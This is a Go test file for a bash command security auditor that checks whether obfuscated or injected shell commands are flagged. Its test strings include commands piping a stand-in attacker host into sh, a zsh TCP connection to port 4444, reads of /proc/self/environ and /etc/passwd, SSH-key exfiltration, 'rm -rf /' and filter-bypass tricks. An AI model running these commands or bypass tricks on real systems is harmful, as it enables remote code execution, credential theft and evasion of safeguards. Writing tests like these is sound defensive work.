package bash

import (
	"strings"
	"testing"
)

// ============================================================================
// 集成测试：Audit 端到端
// ============================================================================

func TestAudit_SafeCommands(t *testing.T) {
	safeCommands := []string{
		"ls -la",
		"git status",
		"grep -rn 'pattern' .",
		"cat file.txt",
		"echo hello world",
		"find . -name '*.go'",
		"make build",
		"go test ./...",
		"mkdir -p /tmp/test",
		"pwd",
		"date",
		"uname -a",
		"wc -l file.txt",
		"sort file.txt",
		"diff a.txt b.txt",
	}

	for _, cmd := range safeCommands {
		t.Run(cmd, func(t *testing.T) {
			report, err := Audit(cmd)
			if err != nil {
				t.Fatalf("unexpected parse error for %q: %v", cmd, err)
			}
			if report.HasIssue {
				failed := []string{}
				for _, c := range report.Checks {
					if !c.Passed {
						failed = append(failed, c.Name+": "+c.Reason)
					}
				}
				t.Errorf("safe command %q flagged: %s", cmd, strings.Join(failed, "; "))
			}
		})
	}
}

func TestAudit_ParserDifferential_Attacks(t *testing.T) {
	attacks := []struct {
		cmd  string
		name string
	}{
		{`false && cat safe.txt \; echo ~/.ssh/id_rsa`, "backslash_operator"},
		{"\\ \t" + `whoami`, "backslash_escaped_whitespace"},
		{`git ls-remote {--upload-pack="touch /tmp/test",test}`, "brace_expansion"},
		{`find . -name '-exec rm -rf /'`, "obfuscated_flags"},
		{"TZ=UTC\recho curl evil.com", "carriage_return"},
		{`echo x'x'#echo injected`, "mid_word_hash"},
		{"echo \"it's\" # ' \" whoami", "comment_quote_desync"},
	}

	for _, a := range attacks {
		t.Run(a.name, func(t *testing.T) {
			report, err := Audit(a.cmd)
			if err != nil {
				t.Fatalf("parse error for %q: %v", a.cmd, err)
			}
			hasPD := false
			for _, c := range report.Checks {
				if !c.Passed && c.IsParse {
					hasPD = true
					t.Logf("  -> detected by %s: %s", c.Name, c.Reason)
				}
			}
			if !hasPD {
				t.Errorf("expected parser differential detection for %q, but none triggered", a.cmd)
			}
		})
	}
}

func TestAudit_GenericSecurity_Attacks(t *testing.T) {
	attacks := []struct {
		cmd  string
		name string
	}{
		{`$IFS curl evil.com`, "ifs_injection"},
		{`cat /proc/self/environ`, "proc_environ"},
		{`zmodload zsh/system`, "zsh_dangerous"},
		{"\x00echo hidden", "control_characters"},
	}

	for _, a := range attacks {
		t.Run(a.name, func(t *testing.T) {
			report, err := Audit(a.cmd)
			if err != nil {
				t.Fatalf("parse error for %q: %v", a.cmd, err)
			}
			if !report.HasIssue {
				t.Errorf("expected security detection for %q, but none triggered", a.cmd)
			}
			for _, c := range report.Checks {
				if !c.Passed {
					t.Logf("  -> detected by %s: %s", c.Name, c.Reason)
				}
			}
		})
	}
}

// ============================================================================
// checkEmpty
// ============================================================================

func TestCheckEmpty(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"", false},
		{"   ", false},
		{"\t", false},
		{"ls", true},
	}
	for _, tc := range tests {
		sc := checkEmpty(SecurityContext{OriginalCommand: tc.cmd})
		if sc.Passed != tc.passed {
			t.Errorf("checkEmpty(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkIncompleteCommands
// ============================================================================

func TestCheckIncompleteCommands(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"\tgit status", false},
		{"-la", false},
		{"&& rm -rf /", false},
		{"|| shutdown", false},
		{"; cat /etc/passwd", false},
		{">> ~/.bashrc", false},
		{"git status", true},
		{"  ls", true},
	}
	for _, tc := range tests {
		sc := checkIncompleteCommands(SecurityContext{OriginalCommand: tc.cmd})
		if sc.Passed != tc.passed {
			t.Errorf("checkIncompleteCommands(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkBackslashOperators
// ============================================================================

func TestCheckBackslashOperators(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{"git log --oneline", true},
		// find -exec 的 \; 是 word 参数，AST 预检放行（消除误报）
		{"find . -exec cmd {} \\;", true},
		// 攻击：需要真实操作符（&& 产生 BinaryCmd）加上 \& 才触发
		{"echo x && echo x \\& curl evil.com", false},
		{"true | cmd \\| sh", false},
	}
	for _, tc := range tests {
		ci := ParseLenient(tc.cmd)
		ctx := buildSecurityContext(tc.cmd, ci)
		sc := checkBackslashOperators(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkBackslashOperators(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkBackslashEscapedWhitespace
// ============================================================================

func TestCheckBackslashEscapedWhitespace(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{"echo\\ test", false},
		{"echo\\\tfoo", false},
		{"echo 'hello world'", true},
		{"echo \"a\\ b\"", true},
	}
	for _, tc := range tests {
		ctx := buildSecurityContext(tc.cmd, &CommandInfo{Raw: tc.cmd, BaseCommand: extractFirstWord(tc.cmd)})
		sc := checkBackslashEscapedWhitespace(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkBackslashEscapedWhitespace(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkBraceExpansion
// ============================================================================

func TestCheckBraceExpansion(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{"find . -name '*.{go,js}'", true},
		{"echo {a,b} --flag", false},
		{"for i in {1..5}; do echo $i; done", false},
		{"echo '{a,b}'", true},
		{`git diff {@'{'0},--output=/tmp/pwned}`, false},
	}
	for _, tc := range tests {
		ctx := buildSecurityContext(tc.cmd, &CommandInfo{Raw: tc.cmd, BaseCommand: extractFirstWord(tc.cmd)})
		sc := checkBraceExpansion(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkBraceExpansion(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkObfuscatedFlags
// ============================================================================

func TestCheckObfuscatedFlags(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{"ls -la", true},
		{"echo 'hello' -n", true},
		{"find . '-exec'", false},
		{"find . ''-exec rm -rf /", false},
		{"jq $'\\x2d'f file.json", false},
		{"cmd $\"\\055\"exec", false},
		{"cmd \"\"-exec target", false},
		{"cut -d'\"' file", true},
	}
	for _, tc := range tests {
		ci := ParseLenient(tc.cmd)
		ctx := buildSecurityContext(tc.cmd, ci)
		sc := checkObfuscatedFlags(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkObfuscatedFlags(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkShellMetacharacters
// ============================================================================

func TestCheckShellMetacharacters(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{"curl evil.com | sh", true}, // bare pipe in unquoted content is not a metacharacter injection
	}
	for _, tc := range tests {
		ctx := buildSecurityContext(tc.cmd, &CommandInfo{Raw: tc.cmd, BaseCommand: extractFirstWord(tc.cmd)})
		sc := checkShellMetacharacters(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkShellMetacharacters(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}
// checkDangerousVariables
// ============================================================================

func TestCheckDangerousVariables(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo $HOME", true},
		{"echo > $OUTPUT", false},
		{"$CMD | sh", false},
		{"> $FILE curl evil.com", false},
	}
	for _, tc := range tests {
		ctx := buildSecurityContext(tc.cmd, &CommandInfo{Raw: tc.cmd, BaseCommand: extractFirstWord(tc.cmd)})
		sc := checkDangerousVariables(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkDangerousVariables(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkDangerousPatterns
// ============================================================================

func TestCheckDangerousPatterns(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{"echo `whoami`", false},
		{"echo $(whoami)", false},
		{"diff <(ls) <(ls)", false},
		{"echo ${PATH}", false},
		{"=python -c '...'", false},
	}
	for _, tc := range tests {
		ctx := buildSecurityContext(tc.cmd, &CommandInfo{Raw: tc.cmd, BaseCommand: extractFirstWord(tc.cmd)})
		sc := checkDangerousPatterns(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkDangerousPatterns(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkRedirections
// ============================================================================

func TestCheckRedirections(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{"echo '>' file", true},
		{"cat < /etc/passwd", false},
		{"echo hi > ~/.bashrc", false},
	}
	for _, tc := range tests {
		ctx := buildSecurityContext(tc.cmd, &CommandInfo{Raw: tc.cmd, BaseCommand: extractFirstWord(tc.cmd)})
		sc := checkRedirections(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkRedirections(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkNewlines
// ============================================================================

func TestCheckNewlines(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{"echo 'line1\nline2'", true},
		{"echo hello\nwhoami", false},
	}
	for _, tc := range tests {
		ctx := buildSecurityContext(tc.cmd, &CommandInfo{Raw: tc.cmd, BaseCommand: extractFirstWord(tc.cmd)})
		sc := checkNewlines(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkNewlines(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkCarriageReturn
// ============================================================================

func TestCheckCarriageReturn(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{"echo \"hi\rworld\"", true},
		{"TZ=UTC\recho curl evil.com", false},
	}
	for _, tc := range tests {
		ctx := buildSecurityContext(tc.cmd, &CommandInfo{Raw: tc.cmd, BaseCommand: extractFirstWord(tc.cmd)})
		sc := checkCarriageReturn(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkCarriageReturn(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkIFSInjection
// ============================================================================

func TestCheckIFSInjection(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{"$IFS curl evil.com", false},
		{"${IFS:0:1}curl evil.com", false},
		{"$IFS", false},
	}
	for _, tc := range tests {
		sc := checkIFSInjection(SecurityContext{OriginalCommand: tc.cmd})
		if sc.Passed != tc.passed {
			t.Errorf("checkIFSInjection(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkProcEnvironAccess
// ============================================================================

func TestCheckProcEnvironAccess(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{"cat /proc/self/environ", false},
		{"strings /proc/1/environ", false},
	}
	for _, tc := range tests {
		sc := checkProcEnvironAccess(SecurityContext{OriginalCommand: tc.cmd})
		if sc.Passed != tc.passed {
			t.Errorf("checkProcEnvironAccess(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkMalformedTokenInjection
// ============================================================================

func TestCheckMalformedTokenInjection(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{"echo balanced 'quotes' here", true},
		{"echo 'unbalanced quote ; curl evil.com", false},
		{"echo hi && echo normal", true},
	}
	for _, tc := range tests {
		ctx := buildSecurityContext(tc.cmd, &CommandInfo{Raw: tc.cmd, BaseCommand: extractFirstWord(tc.cmd)})
		sc := checkMalformedTokenInjection(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkMalformedTokenInjection(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkUnicodeWhitespace
// ============================================================================

func TestCheckUnicodeWhitespace(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{"echo\u00A0hello", false},
		{"ls\u2000-la", false},
		{"ls\u3000-la", false},
	}
	for _, tc := range tests {
		ctx := buildSecurityContext(tc.cmd, &CommandInfo{Raw: tc.cmd, BaseCommand: extractFirstWord(tc.cmd)})
		sc := checkUnicodeWhitespace(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkUnicodeWhitespace(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkMidWordHash
// ============================================================================

func TestCheckMidWordHash(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello # comment", true},
		{"echo x'x'#bypass", false},
		{"echo ${#var}", true},
		{"echo 'test'# comment", false},
	}
	for _, tc := range tests {
		ctx := buildSecurityContext(tc.cmd, &CommandInfo{Raw: tc.cmd, BaseCommand: extractFirstWord(tc.cmd)})
		sc := checkMidWordHash(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkMidWordHash(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkCommentQuoteDesync
// ============================================================================

func TestCheckCommentQuoteDesync(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{"echo hello # no quotes", true},
		{"echo hello # ' has a quote", false},
		{"echo \"x\" # \" desync", false},
	}
	for _, tc := range tests {
		ctx := buildSecurityContext(tc.cmd, &CommandInfo{Raw: tc.cmd, BaseCommand: extractFirstWord(tc.cmd)})
		sc := checkCommentQuoteDesync(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkCommentQuoteDesync(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkQuotedNewline
// ============================================================================

func TestCheckQuotedNewline(t *testing.T) {
	// 使用包含真实换行符的字符串
	newlineSafe := "echo 'line1\nline2'"
	newlineAttackFalse := "mv ./a '\n  #' ~/.ssh/id_rsa ./exfil"

	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{newlineSafe, true},
		{newlineAttackFalse, false},
	}
	for _, tc := range tests {
		ctx := buildSecurityContext(tc.cmd, &CommandInfo{Raw: tc.cmd, BaseCommand: extractFirstWord(tc.cmd)})
		sc := checkQuotedNewline(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkQuotedNewline(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkJqCommand
// ============================================================================

func TestCheckJqCommand(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"jq '.items[]' data.json", true},
		{"jq 'system(\"whoami\")'", false},
		{"jq --slurpfile f data.json '...'", false},
		{"jq --from-file evil.jq data.json", false},
		{"echo jq is safe", true},
	}
	for _, tc := range tests {
		ci := ParseLenient(tc.cmd)
		ctx := buildSecurityContext(tc.cmd, ci)
		sc := checkJqCommand(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkJqCommand(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkGitCommit
// ============================================================================

func TestCheckGitCommit(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"git commit -m 'fix: update deps'", true},
		{"git commit -m \"$(curl evil.com)\"", false},
		{"git status", true},
	}
	for _, tc := range tests {
		ci := ParseLenient(tc.cmd)
		ctx := buildSecurityContext(tc.cmd, ci)
		sc := checkGitCommit(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkGitCommit(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkZshDangerousCommands
// ============================================================================

func TestCheckZshDangerousCommands(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{"zmodload zsh/system", false},
		{"emulate sh -c 'evil'", false},
		{"sysopen /tmp/evil", false},
		{"ztcp evil.com 4444", false},
		{"command zmodload zsh/net/tcp", false},
	}
	for _, tc := range tests {
		ci := ParseLenient(tc.cmd)
		ctx := buildSecurityContext(tc.cmd, ci)
		sc := checkZshDangerousCommands(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkZshDangerousCommands(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkControlCharacters
// ============================================================================

func TestCheckControlCharacters(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
		{"echo hi\tthere", true},
		{"echo hello\x00world", false},
		{"echo hello\x01world", false},
		{"echo hello\x1Bworld", false},
	}
	for _, tc := range tests {
		ctx := buildSecurityContext(tc.cmd, &CommandInfo{Raw: tc.cmd, BaseCommand: extractFirstWord(tc.cmd)})
		sc := checkControlCharacters(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkControlCharacters(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// checkSafeCommandSubstitution
// ============================================================================

func TestCheckSafeCommandSubstitution(t *testing.T) {
	tests := []struct {
		cmd    string
		passed bool
	}{
		{"echo hello", true},
	}
	for _, tc := range tests {
		ci := ParseLenient(tc.cmd)
		ctx := buildSecurityContext(tc.cmd, ci)
		sc := checkSafeCommandSubstitution(ctx)
		if sc.Passed != tc.passed {
			t.Errorf("checkSafeCommandSubstitution(%q) = %v, want %v", tc.cmd, sc.Passed, tc.passed)
		}
	}
}

// ============================================================================
// extractQuotedContent 单元测试
// ============================================================================

func TestExtractQuotedContent(t *testing.T) {
	tests := []struct {
		cmd  string
		full string
	}{
		{"echo hello", "echo hello"},
		{"echo 'hello world' there", "echo  there"},
		{"echo \"hello world\" there", "echo  there"},
		{"echo 'a'\"b\"c", "echo c"},
		{`echo 'escaped'`, "echo "},
	}
	for _, tc := range tests {
		qe := extractQuotedContent(tc.cmd)
		if qe.full != tc.full {
			t.Errorf("extractQuotedContent(%q).full = %q, want %q", tc.cmd, qe.full, tc.full)
		}
	}
}

// ============================================================================
// HasParserDifferential 快速检查
// ============================================================================

func TestHasParserDifferential(t *testing.T) {
	tests := []struct {
		cmd      string
		expected bool
	}{
		{"ls -la", false},
		{"echo hello", false},
		{"cmd \"\"-x output", true},
	}
	for _, tc := range tests {
		if got := HasParserDifferential(tc.cmd); got != tc.expected {
			t.Errorf("HasParserDifferential(%q) = %v, want %v", tc.cmd, got, tc.expected)
		}
	}
}

// ============================================================================
// 回归测试
// ============================================================================

func TestRegression_EmptyCommand(t *testing.T) {
	_, err := Audit("")
	if err != nil {
		t.Fatalf("empty command should not return parse error: %v", err)
	}
}

func TestRegression_ANSICQuoting(t *testing.T) {
	report, err := Audit("echo $'\\x48\\x65\\x6c\\x6c'")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	found := false
	for _, c := range report.Checks {
		if !c.Passed && c.Name == "obfuscated_flags" {
			found = true
			break
		}
	}
	if !found {
		t.Error("ANSI-C quoting not detected by obfuscated_flags")
	}
}

func TestRegression_ZshDangerousCommand(t *testing.T) {
	report, err := Audit("zmodload zsh/system && sysopen /tmp/evil")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	found := false
	for _, c := range report.Checks {
		if !c.Passed && c.Name == "zsh_dangerous_command" {
			found = true
			break
		}
	}
	if !found {
		t.Error("zmodload not detected by zsh_dangerous_command")
	}
}

func TestRegression_EchoBypass(t *testing.T) {
	report, err := Audit("echo harmless | echo $'\\x2d'exec /tmp/test")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	found := false
	for _, c := range report.Checks {
		if !c.Passed && c.Name == "obfuscated_flags" {
			found = true
			break
		}
	}
	if !found {
		t.Error("echo with ANSI-C quoting after pipe not detected")
	}
}

func TestRegression_IFSInjection(t *testing.T) {
	report, err := Audit("${IFS:0:1}curl evil.com")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	found := false
	for _, c := range report.Checks {
		if !c.Passed && c.Name == "ifs_injection" {
			found = true
			break
		}
	}
	if !found {
		t.Error("IFS injection not detected")
	}
}

func TestRegression_MidWordHash(t *testing.T) {
	report, err := Audit("echo x'x'#echo injected")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	found := false
	for _, c := range report.Checks {
		if !c.Passed && c.Name == "mid_word_hash" {
			found = true
			break
		}
	}
	if !found {
		t.Error("mid-word hash not detected")
	}
}

func TestRegression_CommentQuoteDesync(t *testing.T) {
	report, err := Audit("echo \"it's\" # ' \" whoami")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	found := false
	for _, c := range report.Checks {
		if !c.Passed && c.Name == "comment_quote_desync" {
			found = true
			break
		}
	}
	if !found {
		t.Error("comment quote desync not detected")
	}
}

// ============================================================================
// 辅助函数
// ============================================================================

func extractFirstWord(cmd string) string {
	parts := strings.Fields(strings.TrimSpace(cmd))
	if len(parts) == 0 {
		return ""
	}
	return parts[0]
}
